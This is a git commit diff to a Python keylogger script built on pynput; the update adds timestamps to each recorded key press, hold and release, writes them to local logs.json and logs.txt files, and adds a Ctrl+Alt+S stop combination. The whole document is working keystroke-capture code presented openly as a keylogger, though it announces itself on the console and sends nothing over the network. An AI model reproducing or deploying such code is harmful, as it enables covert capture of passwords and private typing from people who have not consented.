095d213a4e46e0510a543ce1bf2e5b3eec1b4bbe
swetha <tswetha3188@gmail.com>
2023-07-31 10:11:52 +0530

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -1,9 +1,13 @@
 from pynput import keyboard
 import json
+import datetime
 
 key_list = []
 x = False
 key_strokes = ""
+
+
+STOP_KEY_COMBINATION = {keyboard.Key.ctrl, keyboard.Key.alt, keyboard.KeyCode.from_char('s')}
 
 def update_txt_file(key_strokes):
     with open('logs.txt', 'w+') as key_stroke:
@@ -16,15 +20,20 @@ def update_json_file(key_list):
 def on_press(key):
     global x, key_list
     if x == False:
-        key_list.append({'held': f'{key}'})
+        key_list.append({'action': 'Pressed', 'key': f'{key}', 'timestamp': str(datetime.datetime.now())})
         x = True
     if x == True:
-        key_list.append({'held': f'{key}'})
+        key_list.append({'action': 'Held', 'key': f'{key}', 'timestamp': str(datetime.datetime.now())})
     update_json_file(key_list)
         
 def on_release(key):
     global x, key_list, key_strokes
-    key_list.append({'Released': f'{key}'})
+
+    if key in STOP_KEY_COMBINATION:
+        print("[+] Keylogger stopped.")
+        return False
+
+    key_list.append({'action': 'Released', 'key': f'{key}', 'timestamp': str(datetime.datetime.now())})
     if x == True:
         x = False
     update_json_file(key_list)
@@ -33,6 +42,7 @@ def on_release(key):
     update_txt_file(key_strokes)
 
 print("[+] Running keylogger successfully!\n[!] Saving the key logs in 'logs.json'")
+print("[!] Press Ctrl + Alt + S to stop the keylogger.")
 
-with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
     listener.join()
